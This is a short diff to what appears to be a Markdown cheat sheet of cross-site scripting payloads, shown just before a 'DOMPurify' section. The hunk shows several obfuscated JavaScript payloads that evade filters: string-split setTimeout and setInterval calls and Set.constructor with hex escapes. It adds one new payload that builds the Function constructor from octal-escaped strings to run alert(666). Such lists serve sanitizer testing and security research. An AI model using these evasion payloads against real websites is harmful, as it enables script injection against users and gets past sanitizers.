@@ -268,6 +268,7 @@ setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
+[666]["\155\141\160"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164(666)")(666)
 ```
 
 ## DOMPurify 
